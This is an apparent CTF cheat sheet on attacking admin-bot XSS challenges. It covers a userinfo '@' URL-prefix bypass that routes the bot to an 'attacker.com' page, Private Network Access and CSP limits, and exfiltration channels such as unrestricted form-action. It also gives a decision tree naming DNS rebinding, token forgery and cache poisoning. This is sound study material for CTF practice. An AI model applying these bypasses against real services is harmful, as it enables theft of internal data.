# Bot XSS Challenges — URL Bypass & PNA Constraints

Patterns for CTF challenges with admin bots (Selenium/Puppeteer headless Chrome) that visit user-supplied URLs, where the flag is on an internal-only service.

---

## URL Prefix Validation Bypass via `@` (userinfo)

**Pattern:** Bot URL must start with `http://127.0.0.1:<port>` (Python `startswith()` check). Bypass with:

```
http://127.0.0.1:7000@attacker.com/exploit.html
```

Browser parses `127.0.0.1:7000` as **userinfo** (credentials), actual host is `attacker.com`. The `startswith()` check passes but the browser navigates to attacker's server.

**Confirmation:** if the bot returns "invalid argument" (Selenium WebDriver error) for malformed URLs, it's a real browser (not curl).

**Limitations:**
- Modern Chrome shows a warning/interstitial for `@` in URLs in some contexts — test if the bot actually follows through.
- `http://127.0.0.1:7000@127.0.0.1:7001/path` navigates to `127.0.0.1:7001/path` (port switching within loopback).

---

## Chrome Private Network Access (PNA) Blocking

**What it blocks:** A page loaded from a MORE PUBLIC network context making subresource requests (fetch/XHR/img/iframe) to a MORE PRIVATE address.

| Source context | Target | Result |
|---|---|---|
| Public IP / HTTPS CDN (e.g. cloudflare) | 127.0.0.1 or private RFC1918 | **BLOCKED** |
| Private (10.x, 192.168.x) | 127.0.0.1 (loopback) | **BLOCKED** |
| Loopback (127.0.0.1:A) | Loopback (127.0.0.1:B) | **ALLOWED** (same address space) |
| Private | Private (same subnet) | **ALLOWED** |

**Key implication for CTF:** If you use the `@`-bypass to route the bot to your external server (cloudflare tunnel, ngrok, public IP), JS on that page CANNOT fetch `127.0.0.1:*` due to PNA. You get `TypeError: Failed to fetch`.

**What PNA does NOT block:**
- Top-level navigation (`window.location`, clicking links, form submission with action=)
- `window.open()` for navigation (but you can't read the opened window cross-origin)

---

## CSP Interaction Matrix (common bot challenge patterns)

| CSP directive | Effect on exfiltration |
|---|---|
| `default-src 'none'; script-src 'unsafe-inline'` | JS runs but can't fetch/img/frame anything. `connect-src` falls to `'none'`. |
| `connect-src 'self'` | fetch() to same-origin only. Cross-port = cross-origin = blocked. |
| `form-action` NOT SET | Forms can submit to ANY URL — exfil channel! |
| `script-src 'nonce-...'` | Only scripts with correct nonce execute. Injected innerHTML scripts won't run. Event handlers also blocked. |

**Exfil under `default-src 'none'; script-src 'unsafe-inline'`:**
- `connect-src` (fetch/XHR/WebSocket) = blocked
- `img-src` (new Image().src) = blocked
- `frame-src` (iframe) = blocked
- `form-action` (if NOT in CSP) = **ALLOWED** — primary exfil channel
- Top-level navigation (`window.location`) = **ALLOWED** by all CSPs (CSP navigate-to is deprecated)

---

## Strategy Decision Tree for Bot + Internal Service

```
1. Can you get JS execution on the SAME loopback address as the target?
   YES → PNA won't block. Check if CSP allows connect-src to target port.
         If not, use form-action (if unrestricted) or navigation-based exfil.
   NO → Continue to 2.

2. Can you use @-bypass to route bot to your external page?
   YES → JS executes on your page (no CSP restriction from your server).
         BUT: PNA blocks fetch to 127.0.0.1.
         Options:
           a) DNS rebinding (complex, needs custom DNS server)
           b) Navigate bot window to internal URL (can't read response)
           c) If target has CORS Access-Control-Allow-Origin:* → fetch works despite PNA? (NO, PNA is separate from CORS)
   NO → Continue to 3.

3. Is there XSS on the internal service itself (port 7001)?
   YES → Navigate bot to XSS URL on target service.
         From that origin, reading own page content is trivial.
         Exfil depends on THAT page's CSP.
   NO → Continue to 4.

4. Does the app have an open redirect or SSRF that proxies internal content?
   YES → Use the proxy/redirect to read internal service through the app.
   NO → Look for:
         - Cookie/JWT forgery (crack secret, forge admin token, access status page directly)
         - Server-side content injection (tickets/data that appears on status page)
         - Race conditions, cache poisoning, or response splitting
```

---

## Cookies and Port Binding

Cookies in browsers are **NOT port-scoped**. A cookie set on `127.0.0.1` (any port) is sent to ALL ports on `127.0.0.1`. This means:
- Admin's auth cookie from port 7000 is automatically sent to port 7001
- If port 7001 accepts the same cookie format, the bot is authenticated there too
- HttpOnly prevents JS from reading `document.cookie`, but the browser still sends it with requests

---

## Bot Detection Fingerprints

| Signal | Meaning |
|---|---|
| "Message: invalid argument" error | Selenium WebDriver (Chrome) |
| `HeadlessChrome/149.0.0.0` in UA | Headless Chrome v149 |
| `Sec-Fetch-Site: none` + `Sec-Fetch-User: ?1` | Top-level user-initiated navigation |
| Bot from IP matching challenge infra | Bot runs on same Docker host |

---

## Common Pitfalls

1. **Cloudflare tunnel forces HTTPS** — mixed content policies may interfere when bot tries to load HTTP resources from an HTTPS page context.
2. **DOMPurify + nonce CSP = double protection** — even if you find an mXSS bypass for DOMPurify, injected scripts won't have the correct nonce. innerHTML-inserted `<script>` tags don't execute anyway.
3. **connect-src 'self' does NOT include other ports** — same IP but different port is a different origin. `'self'` = exact scheme+host+port match only.
4. **Redirect-following and CSP** — when fetch follows a 302 redirect to a different origin, Chrome checks the redirect target against connect-src. The initial URL passing isn't enough.
5. **`form-action` omission in CSP is common** — many CTF authors forget it. Forms can POST to any URL if form-action isn't explicitly restricted. This is your exfil channel when everything else is locked down.
